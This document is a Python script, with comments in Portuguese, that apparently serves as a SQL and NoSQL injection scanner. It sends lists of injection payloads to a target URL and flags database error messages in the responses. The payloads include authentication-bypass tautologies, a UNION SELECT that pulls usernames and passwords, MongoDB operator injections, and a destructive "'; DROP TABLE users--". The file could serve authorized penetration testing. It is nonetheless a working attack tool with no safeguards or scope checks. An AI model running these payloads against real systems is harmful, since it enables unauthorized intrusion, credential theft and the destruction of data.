import requests
import re
import sys
from models.functions import Functions, logging
from halo import Halo

# Configuração do logger
Functions.setup_logger_sqli()

# Payloads para SQL Injection
SQLI_PAYLOADS = [
    "' OR '1'='1", "' OR 1=1--", "' OR 'a'='a", "' UNION SELECT NULL--",
    "' UNION SELECT username, password FROM users--", "' OR '1'='1' #",
    "\" OR \"1\"=\"1", "'; DROP TABLE users--"
]

# Payloads para NoSQL Injection (MongoDB)
NOSQLI_PAYLOADS = [
    "{ '$ne': '' }", "{ '$gt': '' }", "{ '$exists': true }", "{ '$where': '1 == 1' }",
    "' || '1'=='1", "' && this.password.match(/.*/)//", "{ '$regex': '.*' }"
]

# Padrões comuns de erro em SQL Injection
SQL_ERROR_PATTERNS = [
    "SQL syntax", "mysql_fetch", "ORA-", "syntax error", "Unclosed quotation mark",
    "quoted string not properly terminated", "Microsoft OLE DB Provider"
]

# Padrões comuns de erro em NoSQL Injection
NOSQL_ERROR_PATTERNS = [
    "E11000 duplicate key", "MongoDB server error", "TypeError", "bson.errors",
    "Unexpected token", "invalid operator", "Error parsing JSON"
]

def test_sql_injection(url):
    """
    Testa a URL fornecida para SQL Injection usando payloads comuns.
    """
    print("\n🔥 Testing for SQL Injection...")
    for payload in SQLI_PAYLOADS:
        spinner = Halo(text=f"Testing payload: {payload}", spinner="dots")
        spinner.start()
        
        params = {"input": payload}  # Substitua 'input' pelo parâmetro real da URL
        try:
            response = requests.get(url, params=params, timeout=5)
            for pattern in SQL_ERROR_PATTERNS:
                if re.search(pattern, response.text, re.IGNORECASE):
                    spinner.succeed(f"⚠️ Potential SQL Injection found with payload: {payload}")
                    Functions.log_sqli(url, payload, response.text)
                    break
            else:
                spinner.fail(f"No vulnerability detected with payload: {payload}")

        except requests.RequestException:
            spinner.fail("❌ Connection error.")

def test_nosql_injection(url):
    """
    Testa a URL fornecida para NoSQL Injection usando payloads comuns.
    """
    print("\n🔥 Testing for NoSQL Injection...")
    for payload in NOSQLI_PAYLOADS:
        spinner = Halo(text=f"Testing payload: {payload}", spinner="dots")
        spinner.start()
        
        json_data = {"username": payload, "password": "test"}  # Substitua pelos campos corretos
        try:
            response = requests.post(url, json=json_data, timeout=5)
            for pattern in NOSQL_ERROR_PATTERNS:
                if re.search(pattern, response.text, re.IGNORECASE):
                    spinner.succeed(f"⚠️ Potential NoSQL Injection found with payload: {payload}")
                    Functions.log_sqli(url, payload, response.text)
                    break
            else:
                spinner.fail(f"No vulnerability detected with payload: {payload}")

        except requests.RequestException:
            spinner.fail("❌ Connection error.")

if __name__ == "__main__":
    target_url = Functions.get_url()
    test_sql_injection(target_url)
    test_nosql_injection(target_url)
    print("\n✅ Testing complete!")
